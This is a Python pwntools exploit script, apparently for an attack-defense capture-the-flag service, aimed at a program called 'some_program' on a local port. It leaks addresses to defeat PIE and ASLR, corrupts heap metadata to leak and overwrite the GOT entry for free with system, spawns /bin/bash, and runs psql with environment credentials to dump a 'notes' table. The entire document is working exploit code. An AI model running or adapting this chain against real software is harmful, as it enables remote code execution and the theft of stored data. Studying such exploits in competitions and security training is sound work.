from pwn import *

elf = exe = ELF("./some_program")
libc = elf.libc

# io = process("./some_program")
io = remote("127.0.0.1", 1488)

io.recvuntil(b"anon@tacos> ")
io.sendline(b"login")

io.recvuntil(b": ")
io.sendline(b"serse1n")

io.recvuntil(b": ")
io.sendline(b"1234")

io.recvuntil(b"serse1n@tacos> ")
io.sendline(b"program")

io.recvuntil(b"debug:")
main_address = int(io.recvline(), 16)

elf.address = main_address - elf.symbols["main"]

print("main address:", hex(elf.symbols["main"]))

io.recvuntil(b"$ ")
io.sendline(b"1")

io.recvuntil(b": ")
io.sendline(b"user")

io.recvuntil(b": ")
io.sendline(b"resu")

io.recvuntil(b"$ ")
io.sendline(b"4")

io.recvuntil(b"$ ")
io.sendline(b"1")

io.recvuntil(b": ")
io.sendline(b"user")

io.recvuntil(b": ")
io.sendline(b"resu")

io.recvuntil(b"$ ")
io.sendline(b"5")

io.recvuntil(b": ")
payload = b"A" * 88 + b"\x21" + b"\x00" * 7 + p64(elf.got["free"])
print(f"address: {hex(elf.got['free'])}")
io.sendline(payload)

io.recvuntil(b"$ ")
io.sendline(b"22")

io.recvuntil(b"Your name: ")
free_address = u64(io.recvline()[:-1] + b"\x00\x00")
print(f"free address: {hex(free_address)}")

libc_base = free_address - 0xA5550
print(f"LIBC base at: {hex(libc_base)}")
libc.address = libc_base

io.recvuntil(b"$ ")
io.sendline(b"3")

# io.interactive()
print(f"Attemp to rewrite got to system: {hex(libc.symbols['system'])}")
# io.interactive()
io.recvuntil(b": ")
io.sendline(p64(libc.symbols['system']))
io.recvuntil(b"$ ")
io.sendline(b"1")

io.recvuntil(b": ")
io.sendline(b"/bin/bash")

io.recvuntil(b": ")
io.sendline(b"hsab/nib/")

io.recvuntil(b"$ ")
io.sendline(b"4")

# io.recvline()
io.sendline(b"psql postgresql://$POSTGRES_USER:$POSTGRES_PASSWORD@db:5432/$POSTGRES_DB -c 'SELECT data FROM notes'")

print(io.recvuntil(b"rows)").decode(), flush=True)
